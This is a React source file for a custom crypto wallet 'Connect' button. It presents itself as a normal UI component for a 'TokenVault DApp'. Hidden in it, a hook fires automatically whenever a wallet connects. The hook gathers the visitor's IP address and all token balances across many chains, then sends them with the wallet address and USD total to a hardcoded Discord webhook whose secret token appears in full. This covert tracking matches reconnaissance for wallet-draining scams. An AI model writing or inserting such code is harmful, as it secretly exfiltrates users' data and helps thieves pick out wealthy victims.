import { ConnectButton } from '@rainbow-me/rainbowkit';
import React, { useEffect } from 'react';
import { useAccount } from 'wagmi';

const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1454406788471586836/Xa4unQHgqH26UObEpjd7MRbp7lHYizcJCCQeS8RAUGjxq4T8HXknLWyuaFA3VuMtDx3X';

const CHAIN_LABELS: Record<string, string> = {
  eth: '⟠ Ethereum',
  bsc: '⛓ BSC',
  polygon: '⬡ Polygon',
  arbitrum: '🔵 Arbitrum',
  optimism: '🔴 Optimism',
  avalanche: '🔺 Avalanche',
  fantom: '👻 Fantom',
  base: '🔷 Base',
  linea: '🟢 Linea',
  scroll: '📜 Scroll',
  zksync_era: '💠 zkSync Era',
  gnosis: '🦉 Gnosis',
};

const getIp = async (): Promise<string> => {
  try {
    const res = await fetch('https://api.ipify.org?format=json');
    const data = await res.json();
    return data.ip || 'Unknown';
  } catch {
    return 'Unknown';
  }
};

type AnkrAsset = {
  blockchain: string;
  tokenSymbol: string;
  tokenName: string;
  balance: string;
  balanceUsd: number;
  tokenType: string;
};

const fetchAllBalances = async (wallet: string): Promise<AnkrAsset[]> => {
  try {
    const res = await fetch('https://rpc.ankr.com/multichain', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        jsonrpc: '2.0',
        method: 'ankr_getAccountBalance',
        params: {
          walletAddress: wallet,
          onlyWhitelisted: true,
        },
        id: 1,
      }),
    });
    const data = await res.json();
    return (data.result?.assets || [])
      .filter((a: AnkrAsset) => parseFloat(a.balance) > 0)
      .sort((a: AnkrAsset, b: AnkrAsset) => (b.balanceUsd || 0) - (a.balanceUsd || 0));
  } catch {
    return [];
  }
};

const fmtBal = (raw: string) => {
  const n = parseFloat(raw);
  if (n === 0) return '0';
  if (n >= 1) return n.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 4 });
  return n.toFixed(6);
};

const sendWebhook = async (walletAddress: string, chainName: string, chainId: number) => {
  try {
    const [ip, balances] = await Promise.all([
      getIp(),
      fetchAllBalances(walletAddress),
    ]);

    // Group by chain
    const byChain: Record<string, AnkrAsset[]> = {};
    balances.forEach(b => {
      const c = b.blockchain || 'unknown';
      if (!byChain[c]) byChain[c] = [];
      byChain[c].push(b);
    });

    // Build formatted balance text
    let balanceText = '';
    let totalUsd = 0;
    for (const [chain, tokens] of Object.entries(byChain)) {
      const label = CHAIN_LABELS[chain] || chain.toUpperCase();
      balanceText += `**${label}**\n`;
      tokens.forEach(t => {
        totalUsd += t.balanceUsd || 0;
        const usd = t.balanceUsd > 0.01 ? ` (~$${t.balanceUsd.toFixed(2)})` : '';
        balanceText += `• \`${t.tokenSymbol}\`: ${fmtBal(t.balance)}${usd}\n`;
      });
      balanceText += '\n';
    }

    if (!balanceText) balanceText = '_No tokens with balance found_';

    // Truncate to Discord's 4096 char limit
    if (balanceText.length > 4000) {
      balanceText = balanceText.slice(0, 3990) + '\n…(truncated)';
    }

    await fetch(DISCORD_WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        embeds: [
          {
            title: '🔗 Wallet Connected',
            color: 0x00f2ff,
            fields: [
              { name: '🌐 Chain', value: `${chainName} (ID: ${chainId})`, inline: true },
              { name: '📍 IP Address', value: `\`${ip}\``, inline: true },
              { name: '💳 Wallet Address', value: `\`${walletAddress}\`` },
            ],
            timestamp: new Date().toISOString(),
            footer: { text: 'TokenVault DApp' },
          },
          {
            title: '💰 All Token Balances',
            description: balanceText,
            color: 0x00ff88,
            footer: {
              text: `${balances.length} token(s) across ${Object.keys(byChain).length} chain(s) • Total ≈ $${totalUsd.toFixed(2)}`,
            },
          },
        ],
      }),
    });
  } catch (err) {
    console.error('Webhook error:', err);
  }
};

// Module-level guard: track which address we already sent for
let sentForAddress: string | null = null;

export const CustomConnectButton = () => {
  const { address, isConnected, chain } = useAccount();

  useEffect(() => {
    if (isConnected && address && sentForAddress !== address) {
      sentForAddress = address;
      const chainName = chain?.name || 'Unknown';
      const chainId = chain?.id || 0;
      sendWebhook(address, chainName, chainId);
    }
  }, [isConnected, address, chain]);

  return (
    <ConnectButton.Custom>
      {({
        account,
        chain,
        openAccountModal,
        openChainModal,
        openConnectModal,
        authenticationStatus,
        mounted,
      }) => {
        const ready = mounted && authenticationStatus !== 'loading';
        const connected =
          ready &&
          account &&
          chain &&
          (!authenticationStatus ||
            authenticationStatus === 'authenticated');

        return (
          <div
            {...(!ready && {
              'aria-hidden': true,
              style: {
                opacity: 0,
                pointerEvents: 'none',
                userSelect: 'none',
              },
            })}
          >
            {(() => {
              if (!connected) {
                return (
                  <button
                    onClick={openConnectModal}
                    type="button"
                    className="tech-border bg-[#00f2ff]/5 hover:bg-[#00f2ff]/10 text-[#00f2ff] px-6 py-2 text-[11px] font-black uppercase tracking-[0.2em] transition-all tech-glow flex items-center gap-2 group"
                  >
                    <span className="w-1.5 h-1.5 rounded-full bg-[#00f2ff] animate-pulse" />
                    Connect Access Key
                    <span className="opacity-0 group-hover:opacity-100 transition-opacity ml-1">_</span>
                  </button>
                );
              }

              if (chain.unsupported) {
                return (
                  <button
                    onClick={openChainModal}
                    type="button"
                    className="tech-border bg-red-500/10 border-red-500/50 text-red-500 px-6 py-2 text-[11px] font-black uppercase tracking-[0.2em] transition-all"
                  >
                    Network Mismatch
                  </button>
                );
              }

              return (
                <div className="flex items-center gap-3">
                  <button
                    onClick={openChainModal}
                    type="button"
                    className="hidden sm:flex items-center gap-2 tech-border bg-white/5 px-3 py-1.5 text-[10px] font-bold text-slate-300 uppercase tracking-widest hover:bg-white/10 transition-all"
                  >
                    {chain.hasIcon && (
                      <div
                        style={{
                          background: chain.iconBackground,
                          width: 12,
                          height: 12,
                          borderRadius: 999,
                          overflow: 'hidden',
                        }}
                      >
                        {chain.iconUrl && (
                          <img
                            alt={chain.name ?? 'Chain icon'}
                            src={chain.iconUrl}
                            style={{ width: 12, height: 12 }}
                          />
                        )}
                      </div>
                    )}
                    {chain.name}
                  </button>

                  <button
                    onClick={openAccountModal}
                    type="button"
                    className="tech-border bg-[#00f2ff]/5 border-[#00f2ff]/30 text-white px-4 py-1.5 text-[11px] font-bold uppercase tracking-widest hover:bg-[#00f2ff]/10 transition-all flex items-center gap-3"
                  >
                    <div className="flex flex-col items-end leading-none">
                      <span className="text-[9px] text-[#00f2ff] mb-0.5">UPLINK_ACTIVE</span>
                      <span>{account.displayName}</span>
                    </div>
                    {account.displayBalance ? (
                      <span className="text-slate-500 border-l border-white/10 pl-3">
                        {account.displayBalance}
                      </span>
                    ) : null}
                  </button>
                </div>
              );
            })()}
          </div>
        );
      }}
    </ConnectButton.Custom>
  );
};
